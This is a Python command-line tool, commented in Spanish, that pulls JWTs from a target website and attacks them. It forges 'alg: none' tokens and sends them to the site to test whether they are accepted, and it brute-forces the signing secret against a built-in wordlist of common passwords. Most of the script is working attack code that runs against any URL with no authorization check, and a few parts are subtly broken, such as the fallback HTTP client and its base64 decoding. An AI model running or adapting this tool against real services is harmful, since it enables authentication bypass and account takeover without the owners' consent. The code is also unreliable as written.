#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JWT ANALYZER v2.0 - TANQUE EDITION
Detección de vulnerabilidades · Algoritmo none · Firma débil · Bruteforce de secretos
"""

import asyncio
import json
import base64
import hashlib
import hmac
import re
import sys
import random
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional
import time

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None

class JWTAnalyzer:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Patrones para encontrar JWT
        self.jwt_patterns = [
            r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',  # JWT estándar
            r'["\']authorization["\']\s*:\s*["\']Bearer\s+([^"\']+)["\']',  # Header Auth
            r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',  # Token en JSON
            r'access[_\-]token["\']?\s*[:=]\s*["\']([^"\']+)["\']',  # Access token
            r'["\']jwt["\']\s*:\s*["\']([^"\']+)["\']',  # JWT field
            r'id[_\-]token["\']?\s*[:=]\s*["\']([^"\']+)["\']',  # ID token
        ]
        
        # Algoritmos inseguros
        self.weak_algorithms = ['none', 'HS256', 'HS384', 'HS512']
        
        # Payloads para algoritmo none
        self.none_payloads = [
            '{"alg":"none"}',
            '{"alg":"None"}',
            '{"alg":"NONE"}',
            '{"typ":"JWT","alg":"none"}',
            '{"alg":"none","typ":"JWT"}'
        ]
        
        # Wordlist de secretos comunes para brute force
        self.common_secrets = [
            'secret', 'password', '123456', 'admin', 'token', 'jwt',
            'key', 'secretkey', 'privatekey', 'publickey', 'changeme',
            'supersecret', 'mysecret', 'appsecret', 'api_secret',
            'test', 'test123', 'demo', 'sample', 'example',
            'strongpassword', 'securekey', 'cGFzc3dvcmQ=', 'qwerty',
            'abc123', 'letmein', 'monkey', 'dragon', 'master',
            'hello', 'world', 'admin123', 'root', 'toor',
            'password123', '12345678', '123456789', 'qwerty123',
            '1q2w3e4r', '1qaz2wsx', 'zaq1xsw2', 'adminadmin',
            'jwtsecret', 'jwttoken', 'bearer', 'auth', 'authentication',
            'clave', 'contraseña', 'llave', 'secreto', 'token_secreto',
            'aws', 'azure', 'google', 'cloud', 'server', 'backend',
            'prod', 'production', 'dev', 'development', 'test', 'testing',
            'local', 'localhost', '127.0.0.1', '0.0.0.0'
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=15, max_retries=2)
        
    def decode_jwt(self, token: str) -> Optional[Dict]:
        """Decodifica un JWT sin verificar la firma"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
                
            # Añadir padding si es necesario
            def add_padding(s):
                return s + '=' * (-len(s) % 4)
                
            header = json.loads(base64.b64decode(add_padding(parts[0])).decode('utf-8'))
            payload = json.loads(base64.b64decode(add_padding(parts[1])).decode('utf-8'))
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'raw': token
            }
        except Exception as e:
            return None
            
    def verify_signature(self, token: str, secret: str) -> bool:
        """Verifica si un token JWT es válido con un secreto"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
                
            header_payload = f"{parts[0]}.{parts[1]}"
            signature = parts[2]
            
            # Decodificar header para saber algoritmo
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            alg = header.get('alg', 'HS256')
            
            if alg == 'HS256':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
            elif alg == 'HS384':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), header_payload.encode(), hashlib.sha384).digest()
                ).decode().rstrip('=')
            elif alg == 'HS512':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), header_payload.encode(), hashlib.sha512).digest()
                ).decode().rstrip('=')
            else:
                return False
                
            return signature == expected
        except:
            return False
            
    async def extract_tokens(self) -> List[str]:
        """Extrae tokens JWT de todas las fuentes posibles"""
        tokens = []
        
        # 1. URL actual
        try:
            resp = await self.client.get(self.url)
            if resp:
                text = await resp.text()
                headers = dict(resp.headers)
                
                # Headers
                auth = headers.get('authorization', '')
                if 'bearer' in auth.lower():
                    tokens.append(auth.split(' ')[-1])
                    
                # Cookies
                cookie = headers.get('set-cookie', '')
                for pattern in self.jwt_patterns:
                    matches = re.findall(pattern, cookie)
                    tokens.extend(matches)
                    
                # HTML
                for pattern in self.jwt_patterns:
                    matches = re.findall(pattern, text)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        if match and len(match) > 20:
                            tokens.append(match)
        except:
            pass
            
        # 2. Endpoints comunes
        if self.aggressive:
            endpoints = ['/api', '/api/v1', '/graphql', '/auth', '/login', '/token']
            for endpoint in endpoints:
                try:
                    url = urljoin(self.url, endpoint)
                    resp = await self.client.get(url)
                    if resp:
                        text = await resp.text()
                        for pattern in self.jwt_patterns:
                            matches = re.findall(pattern, text)
                            tokens.extend(matches)
                except:
                    pass
                    
        return list(set(tokens))
        
    def analyze_token(self, token: str, source: str) -> List[Dict]:
        """Analiza un token en profundidad"""
        findings = []
        decoded = self.decode_jwt(token)
        
        if not decoded:
            return findings
            
        header = decoded['header']
        payload = decoded['payload']
        
        # 1. Algoritmo none
        if header.get('alg', '').lower() == 'none':
            findings.append({
                'type': 'JWT_ALG_NONE',
                'severity': 'CRITICO',
                'message': 'Token con algoritmo "none" - Vulnerabilidad crítica',
                'token': token[:50] + '...',
                'source': source,
                'details': header
            })
            
        # 2. Algoritmo débil
        if header.get('alg') in self.weak_algorithms:
            findings.append({
                'type': 'JWT_WEAK_ALG',
                'severity': 'ALTO',
                'message': f"Algoritmo {header.get('alg')} - Puede ser vulnerable",
                'token': token[:50] + '...',
                'source': source,
                'details': header
            })
            
        # 3. Sin algoritmo
        if 'alg' not in header:
            findings.append({
                'type': 'JWT_NO_ALG',
                'severity': 'ALTO',
                'message': 'Token sin especificar algoritmo',
                'token': token[:50] + '...',
                'source': source
            })
            
        # 4. Claims peligrosos
        dangerous = ['admin', 'role', 'is_admin', 'administrator', 'root', 'superuser']
        for claim in dangerous:
            if claim in payload:
                val = payload[claim]
                if val in [True, 'true', 'True', 1, '1', 'admin', 'root']:
                    findings.append({
                        'type': 'JWT_ADMIN_CLAIM',
                        'severity': 'ALTO',
                        'message': f"Claim administrativo '{claim}: {val}'",
                        'token': token[:50] + '...',
                        'source': source
                    })
                    
        # 5. Información sensible
        sensitive = ['password', 'secret', 'api_key', 'ssn', 'credit', 'card', 'token']
        for key in sensitive:
            if key in payload:
                findings.append({
                    'type': 'JWT_SENSITIVE_DATA',
                    'severity': 'ALTO',
                    'message': f"Información sensible: '{key}'",
                    'token': token[:50] + '...',
                    'source': source
                })
                
        # 6. Token sin expiración
        if 'exp' not in payload:
            findings.append({
                'type': 'JWT_NO_EXPIRY',
                'severity': 'MEDIO',
                'message': 'Token sin fecha de expiración',
                'token': token[:50] + '...',
                'source': source
            })
            
        # 7. Token expirado
        if 'exp' in payload:
            try:
                exp = int(payload['exp'])
                if exp < time.time():
                    findings.append({
                        'type': 'JWT_EXPIRED',
                        'severity': 'INFO',
                        'message': 'Token expirado',
                        'token': token[:50] + '...',
                        'source': source
                    })
            except:
                pass
                
        return findings
        
    async def test_none_algorithm(self, original_token: str, url: str) -> List[Dict]:
        """Prueba si el endpoint acepta tokens con alg=none"""
        findings = []
        decoded = self.decode_jwt(original_token)
        
        if not decoded:
            return findings
            
        for none_payload in self.none_payloads:
            try:
                # Crear token malicioso
                header_b64 = base64.b64encode(none_payload.encode()).decode().replace('=', '')
                payload_b64 = base64.b64encode(
                    json.dumps(decoded['payload']).encode()
                ).decode().replace('=', '')
                malicious = f"{header_b64}.{payload_b64}."
                
                headers = {'Authorization': f'Bearer {malicious}'}
                resp = await self.client.get(url, headers=headers)
                
                if resp and resp.status == 200:
                    findings.append({
                        'type': 'JWT_NONE_ACCEPTED',
                        'severity': 'CRITICO',
                        'message': 'Endpoint acepta tokens con algoritmo none',
                        'url': url,
                        'token': malicious[:50] + '...'
                    })
                    break
            except:
                pass
                
        return findings
        
    async def brute_force_secret(self, token: str) -> List[Dict]:
        """Intenta adivinar el secreto con wordlist"""
        findings = []
        
        for secret in self.common_secrets:
            if self.verify_signature(token, secret):
                findings.append({
                    'type': 'JWT_WEAK_SECRET',
                    'severity': 'CRITICO',
                    'message': f'Secreto débil encontrado: "{secret}"',
                    'token': token[:50] + '...',
                    'secret': secret
                })
                break
                
        return findings
        
    async def scan(self):
        """Ejecuta análisis completo"""
        print(f"\n🔑 JWT ANALYZER v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            # 1. Extraer tokens
            print("[*] Buscando tokens JWT...")
            tokens = await self.extract_tokens()
            
            if not tokens:
                print("[!] No se encontraron tokens")
                return []
                
            print(f"[*] Encontrados {len(tokens)} tokens")
            
            # 2. Analizar cada token
            for i, token in enumerate(tokens, 1):
                print(f"\n[*] Token {i}/{len(tokens)}")
                print(f"    {token[:50]}...")
                
                # Análisis básico
                findings = self.analyze_token(token, self.url)
                self.findings.extend(findings)
                
                # Algoritmo none
                if any(f['type'] == 'JWT_WEAK_ALG' for f in findings):
                    none_findings = await self.test_none_algorithm(token, self.url)
                    self.findings.extend(none_findings)
                    
                # Brute force de secreto
                if self.aggressive:
                    print("    [*] Probando secretos comunes...")
                    secret_findings = await self.brute_force_secret(token)
                    self.findings.extend(secret_findings)
                    
                # Mostrar hallazgos del token
                token_criticos = [f for f in findings if f['severity'] == 'CRITICO']
                if token_criticos:
                    for f in token_criticos:
                        print(f"    [[CRITICO]] {f['message']}")
                        
            # Resumen final
            print("\n" + "="*70)
            print("📊 RESULTADOS JWT")
            print("="*70)
            
            if self.findings:
                criticos = [f for f in self.findings if f['severity'] == 'CRITICO']
                altos = [f for f in self.findings if f['severity'] == 'ALTO']
                medios = [f for f in self.findings if f['severity'] == 'MEDIO']
                
                if criticos:
                    print(f"\n[CRITICO] CRÍTICOS: {len(criticos)}")
                    for f in criticos[:10]:
                        print(f"   • {f['message']}")
                        
                if altos:
                    print(f"\n[WARN]  ALTOS: {len(altos)}")
                    
                print(f"\n[OK] TOTAL: {len(self.findings)}")
            else:
                print("\n[OK] No se encontraron problemas")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 jwt_analyzer.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    analyzer = JWTAnalyzer(url, aggressive)
    await analyzer.scan()

if __name__ == "__main__":
    asyncio.run(main())
